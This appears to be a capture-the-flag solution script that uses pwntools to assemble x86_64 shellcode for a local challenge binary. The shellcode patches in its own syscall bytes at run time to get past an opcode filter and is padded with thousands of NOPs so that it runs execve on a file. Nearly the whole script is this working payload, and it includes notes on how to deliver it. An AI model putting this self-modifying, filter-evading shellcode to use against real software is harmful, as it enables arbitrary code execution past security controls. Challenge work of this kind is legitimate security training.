import glob
from pwn import *

context.arch = "x86_64"
#context.log_level = "DEBUG"
assembly = """
	mov byte ptr [rip+syscall1], 0x0f
	mov byte ptr [rip+syscall1+1], 0x05

	.rept 4196
	nop
	.endr

	lea rdi, [rip+flag]
	xor rsi, rsi
	xor rdx, rdx
	push 59
	pop rax
	syscall1:
		.byte 0x13
		.byte 0x37
	flag:
		.ascii "c"
"""

shellcode = asm(assembly)
f = open('shellcode', 'wb')
f.write(shellcode)
# doesnt work because the pipe makes only read 4096 bytes?
# cat shellcode | strace /8 2>&1 | grep ^read

# this works
# /6 < shellcode
exit()
p = process('/6')
#p = process(['strace', '/6'])
print(p.recv(timeout=2).decode())
p.send(shellcode)
p.interactive()
#print(disasm(shellcode))